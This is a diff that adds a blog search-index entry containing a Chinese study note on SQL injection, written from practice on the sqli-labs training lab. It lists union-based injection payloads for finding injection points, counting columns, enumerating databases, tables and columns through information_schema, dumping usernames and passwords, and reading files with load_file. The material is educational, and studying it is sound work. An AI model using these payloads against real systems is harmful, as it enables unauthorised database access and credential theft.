@@ -568,6 +568,25 @@
     
     
     <entry>
+      <title>Brief Discussion on SQL Injection</title>
+      <link href="/2019/01/14/Brief-Discussion-on-SQL-Injection/"/>
+      <url>/2019/01/14/Brief-Discussion-on-SQL-Injection/</url>
+      
+        <content type="html"><![CDATA[<p><strong>sqli-labs是我对sql学习程度的检验，玩了几道题，我查询了相关知识点,总结了一些重要的语法以及知识点，还有类似的题型解法步骤，下面我将一一汇总</strong></p><h2 id="SQL注入漏洞产生的原因"><a href="#SQL注入漏洞产生的原因" class="headerlink" title="SQL注入漏洞产生的原因"></a>SQL注入漏洞产生的原因</h2><p>SQL Injection<br>    程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患<br>    用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据或进行数据库操作</p><h2 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h2><p>Structured Query Language<br>    结构化的查询语言，是关系型数据库通讯的标准语言。<br>        查询：<code>SELECT statement FROM table WHERE condition</code><br>        删除记录：<code>DELETE FROM table WHERE condition</code><br>        更新记录：<code>UPDATE table SET field=value WHERE condtion</code><br>        添加记录：<code>INSERT INTO table field VALUES(values)</code></p><h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><p>1首先测试正常数据，如<code>?id=1</code><br>2)判断是否存在注入点，如在<code>?id=1+【‘】、【and 1=1】或【and 1=2】</code><br>3)判断字段长度,列数如在<code>?id=1+【‘】+【 order by 1 (数字任意)】，id=1‘ order by 1=1 # ,id=1&#39; order by 1=2 #</code><br>4判断字段回显位置，如在<code>?id=1+【‘】+【union select 1,2,3,4,5,6,7,8,9,10,11#】</code><br>5） 判断数据库信息：<br>利用内置函数暴数据库信息<br><strong>version()版本；database()数据库；user()用户；</strong><br>不用猜解可用字段暴数据库信息(有些网站不适用):<br><code>and 1=2 union all select version()</code><br><code>and 1=2 union all select database()</code><br><code>and 1=2 union all select user()</code><br>操作系统信息：<code>and 1=2 union all select @@global.version_compile_os from mysql.user</code><br>数据库权限：</p><figure class="highlight plaintext"><figcaption><span>ord(mid(user(),1,1))</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">6） 查找数据库名</span><br><span class="line">Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息```union select information_schema from information_schema.schemata``` （语句在显示位）</span><br><span class="line">7)查找数据库表名</span><br><span class="line">```union select group_concat(table_name) from information_schema.tables where table_schema=database()```</span><br><span class="line">8)查找列名</span><br><span class="line">```union select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+```</span><br><span class="line">9)获取值</span><br><span class="line">```union select group_concat(username,password) from users--+```</span><br><span class="line">或者```1&#x27; union select 1,(select 列名 from 表名),3,4#```</span><br><span class="line">0)查找数据库表中所有字段以及字段值</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit 0（开始的记录，0为第一个开始记录）,1（显示1条记录）—</span><br><span class="line">and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名（十六进制）limit 0,1</span><br></pre></td></tr></table></figure><p><strong>提权</strong><br>01)猜解账号密码；<br>02） 登陆管理员后台。<br>读文件： union select 绝对路径 load_file<br>写入文件：union select</p><h2 id="判断SQL注入点"><a href="#判断SQL注入点" class="headerlink" title="判断SQL注入点"></a>判断SQL注入点</h2><p>找注入点是最关键,也最基础的一个环节<br>本质原理是:<br>    找一个需要后台处理后<br>    提交给数据库的点<br>    所有的输入只要和数据库进行交互的，都有可能触发SQL注入<br>一般为三大类</p><pre><code>Get参数触发SQL注入POST参数触发SQL注入Cookie触发SQL注入</code></pre><p>例如:<br>    在常规的链接的参数中(链接?参数) 找形如?id&#x3D;num的【,】搜索框的【,】<br>而验证是否存在注入点的方法有很多种<br>最常规,也最简单的方法，引入单引号判断是否存在注入点</p><pre><code>http://host/test.php?id=100’ 返回错误说明有可能注入http://host/test.php?id=100 and 1=1 返回正常http://host/test.php?id=100 and 1=2返回错误</code></pre><p>如果满足上面三点，是注入点的可能性就很高了</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Notes </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>NYSEC 2018 Web</title>
       <link href="/2018/12/10/NYSEC-2018-Web/"/>
       <url>/2018/12/10/NYSEC-2018-Web/</url>
